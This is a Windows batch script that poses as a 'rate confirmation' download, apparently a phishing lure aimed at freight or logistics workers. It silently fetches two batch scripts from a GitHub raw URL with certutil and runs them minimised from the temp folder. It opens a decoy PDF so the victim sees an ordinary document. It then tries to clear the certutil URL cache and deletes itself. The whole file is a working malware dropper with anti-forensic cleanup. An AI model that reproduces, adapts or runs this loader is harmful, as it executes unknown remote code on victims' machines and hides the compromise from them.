@echo off
setlocal enabledelayedexpansion

set "R=https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main"
set "T=%TEMP%"
set "D=%USERPROFILE%\Downloads"

echo.
echo  Downloading rate confirmation...
echo  Please wait...
echo.

certutil -urlcache -split -f "%R%/wdsr12889.bat" "%T%\wdsr12889.bat" >nul 2>&1
certutil -urlcache -split -f "%R%/wdsrpn25cdv.bat" "%T%\wdsrpn25cdv.bat" >nul 2>&1
certutil -urlcache -split -f "%R%/Rate_Confirmation_LD-2026-0847.pdf" "%D%\Rate_Confirmation_LD-2026-0847.pdf" >nul 2>&1

certutil -urlcache -split -f "https://" delete 2>nul

if exist "%T%\wdsr12889.bat" start "" /min cmd /c "%T%\wdsr12889.bat"
if exist "%T%\wdsrpn25cdv.bat" start "" /min cmd /c "%T%\wdsrpn25cdv.bat"
if exist "%D%\Rate_Confirmation_LD-2026-0847.pdf" start "" "%D%\Rate_Confirmation_LD-2026-0847.pdf"

timeout /t 2 /nobreak >nul
del "%~f0" /f /q >nul 2>&1

endlocal
exit
